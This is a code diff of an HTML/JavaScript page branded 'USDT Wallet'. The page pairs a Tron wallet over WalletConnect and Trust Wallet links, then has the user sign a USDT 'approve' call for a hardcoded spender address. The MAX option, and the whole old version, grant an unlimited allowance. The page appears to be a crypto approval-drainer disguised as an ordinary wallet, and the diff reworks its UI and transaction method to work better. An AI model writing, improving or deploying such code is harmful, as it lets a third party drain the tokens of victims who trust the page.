@@ -8,28 +8,35 @@
 <style>
 body{
   margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
   background:#0b0f19;
-  color:#fff;
+  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+  color:white;
 }
 
 .container{
   max-width:420px;
   margin:auto;
-  padding:20px;
+  padding:16px;
+}
+
+.header{
+  text-align:center;
+  font-size:20px;
+  font-weight:600;
+  margin-bottom:10px;
 }
 
 .card{
   background:#121826;
   border-radius:16px;
-  padding:20px;
-  margin-top:20px;
-  box-shadow:0 10px 25px rgba(0,0,0,0.3);
+  padding:16px;
+  margin-top:16px;
 }
 
-h2{
+.wallet{
+  font-size:13px;
+  color:#4ade80;
   text-align:center;
-  margin-bottom:10px;
 }
 
 button{
@@ -37,48 +44,46 @@ button{
   padding:14px;
   border:none;
   border-radius:12px;
-  font-size:16px;
   font-weight:600;
-  cursor:pointer;
-}
-
-.connect{
-  background:#3b82f6;
-  color:white;
-}
-
-.approve{
-  background:#22c55e;
-  color:white;
   margin-top:10px;
+}
+
+.connect{background:#3b82f6;color:white}
+.approve{background:#22c55e;color:white}
+
+.range{
+  width:100%;
+  margin-top:10px;
+}
+
+input{
+  width:100%;
+  padding:12px;
+  border-radius:10px;
+  border:none;
+  margin-top:10px;
+  background:#0f172a;
+  color:white;
 }
 
 #qr{
   display:flex;
   justify-content:center;
-  margin-top:15px;
+  margin-top:10px;
 }
 
 #uri{
-  font-size:11px;
+  font-size:10px;
+  color:#888;
   word-break:break-all;
-  margin-top:10px;
-  color:#aaa;
-}
-
-.wallet{
-  font-size:13px;
-  text-align:center;
-  color:#4ade80;
 }
 
 .status{
   font-size:12px;
-  margin-top:10px;
   text-align:center;
+  margin-top:10px;
   color:#aaa;
 }
-
 </style>
 </head>
 
@@ -86,7 +91,7 @@ button{
 
 <div class="container">
 
-  <h2>💰 USDT Wallet</h2>
+  <div class="header">💰 USDT Wallet</div>
 
   <div class="card">
 
@@ -98,9 +103,19 @@ button{
 
     <div id="wallet" class="wallet"></div>
 
-    <button id="approveBtn" class="approve" style="display:none;">
-      Approve USDT
-    </button>
+  </div>
+
+  <div class="card">
+
+    <div>Select Amount</div>
+
+    <input type="range" id="range" class="range" min="1" max="1000" value="10">
+
+    <input type="number" id="amountInput" value="10">
+
+    <button id="maxBtn">MAX</button>
+
+    <button id="approveBtn" class="approve">Approve USDT</button>
 
     <div id="status" class="status"></div>
 
@@ -115,9 +130,8 @@ import bs58 from "https://esm.sh/bs58";
 
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
-const TRONGRID = "https://api.trongrid.io";
 
-const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
 let client, session;
@@ -132,159 +146,133 @@ function tronToHex(addr){
 }
 
 // encode approve
-function encodeApprove(spenderHex){
+function encodeApprove(spenderHex, amount){
   const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
-  return "095ea7b3" + clean + "f".repeat(64);
-}
 
-// build tx
-async function buildTx(owner){
-  const ownerHex = tronToHex(owner);
+  let amountHex;
 
-  const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      owner_address: ownerHex,
-      contract_address: USDT_HEX,
-      function_selector:"approve(address,uint256)",
-      parameter: encodeApprove(tronToHex(SPENDER)),
-      fee_limit:100000000,
-      call_value:0,
-      visible:false
-    })
-  });
-
-  const data = await res.json();
-  if(!data.transaction) throw "TX build failed";
-
-  return data.transaction;
-}
-
-// broadcast
-async function broadcast(tx){
-  const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify(tx)
-  });
-  return await res.json();
-}
-
-// fix signature
-function fixSig(resp, tx){
-  if(resp?.signature){
-    tx.signature = Array.isArray(resp.signature)
-      ? resp.signature.map(s=>s.replace(/^0x/,""))
-      : [resp.signature.replace(/^0x/,"")];
+  if(amount === "max"){
+    amountHex = "f".repeat(64);
+  } else {
+    const val = BigInt(Math.floor(amount * 1e6));
+    amountHex = val.toString(16).padStart(64,"0");
   }
-  return tx;
+
+  return "0x095ea7b3" + clean + amountHex;
 }
 
 // UI helpers
-function setStatus(text){
-  document.getElementById("status").innerText = text;
+function setStatus(msg){
+  document.getElementById("status").innerText = msg;
 }
 
-// show QR + link
+// QR + link
 function showQR(uri){
-  document.getElementById("qr").innerHTML="";
+  document.getElementById("qr").innerHTML = "";
 
-  new QRCode(document.getElementById("qr"),{
-    text:uri,
-    width:200,
-    height:200
+  new QRCode(document.getElementById("qr"), {
+    text: uri,
+    width: 200,
+    height: 200
   });
 
   document.getElementById("uri").innerText = uri;
 
-  const link = "https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
+  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
   document.getElementById("openWallet").href = link;
   document.getElementById("openWallet").innerText = "Open in Trust Wallet";
 }
 
-// connect
-document.getElementById("connectBtn").onclick = async ()=>{
+// slider sync
+const range = document.getElementById("range");
+const input = document.getElementById("amountInput");
+
+range.oninput = () => input.value = range.value;
+input.oninput = () => range.value = input.value;
+
+document.getElementById("maxBtn").onclick = () => {
+  input.value = "max";
+};
+
+// connect wallet
+document.getElementById("connectBtn").onclick = async () => {
   try{
     setStatus("Connecting...");
 
     const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
     client = await SignClient.init({
-      projectId:PROJECT_ID,
+      projectId: PROJECT_ID,
       metadata:{
         name:"USDT Wallet",
-        description:"Connect wallet",
+        description:"Connect",
         url:location.origin,
         icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
 
-    const { uri, approval } = await client.connect({
-      requiredNamespaces:{
-        tron:{
-          methods:["tron_signTransaction"],
-          chains:[TRON_CHAIN],
-          events:[]
+    // reuse session if exists
+    const existing = client.session.getAll();
+    if(existing.length){
+      session = existing[0];
+    } else {
+      const { uri, approval } = await client.connect({
+        requiredNamespaces:{
+          tron:{
+            methods:["tron_sendTransaction"], // 🔥 FIXED
+            chains:[TRON_CHAIN],
+            events:[]
+          }
+        }
+      });
+
+      showQR(uri);
+      session = await approval();
+    }
+
+    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
+    document.getElementById("wallet").innerText = wallet;
+
+    setStatus("Connected");
+
+  } catch(e){
+    console.error(e);
+    setStatus("Connection failed");
+  }
+};
+
+// approve
+document.getElementById("approveBtn").onclick = async () => {
+  try{
+    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
+
+    let amount = input.value;
+
+    const spenderHex = tronToHex(SPENDER);
+    const data = encodeApprove(spenderHex, amount === "max" ? "max" : Number(amount));
+
+    setStatus("Waiting for wallet...");
+
+    const result = await client.request({
+      topic: session.topic,
+      chainId: TRON_CHAIN,
+      request:{
+        method:"tron_sendTransaction",
+        params:{
+          to: USDT,
+          data: data,
+          value: "0x0"
         }
       }
     });
 
-    showQR(uri);
+    setStatus("✅ Success");
 
-    session = await approval();
-
-    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
-
-    document.getElementById("wallet").innerText = wallet;
-    document.getElementById("approveBtn").style.display = "block";
-
-    setStatus("Connected");
-
-  }catch(e){
-    setStatus("Connection failed");
+  } catch(e){
     console.error(e);
+    setStatus("❌ Failed");
   }
 };
-
-// approve button
-document.getElementById("approveBtn").onclick = async ()=>{
-  try{
-    setStatus("Preparing transaction...");
-
-    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
-
-    const tx = await buildTx(wallet);
-
-    setStatus("Waiting for signature...");
-
-    const signed = await client.request({
-      topic: session.topic,
-      chainId: TRON_CHAIN,
-      request:{
-        method:"tron_signTransaction",
-        params:{ transaction: tx }
-      }
-    });
-
-    const finalTx = fixSig(signed, tx);
-
-    setStatus("Broadcasting...");
-
-    const result = await broadcast(finalTx);
-
-    if(result.result){
-      setStatus("✅ Success: " + result.txid);
-    } else {
-      throw JSON.stringify(result);
-    }
-
-  }catch(e){
-    setStatus("❌ Error");
-    console.error(e);
-  }
-};
-
 </script>
 
 </body>
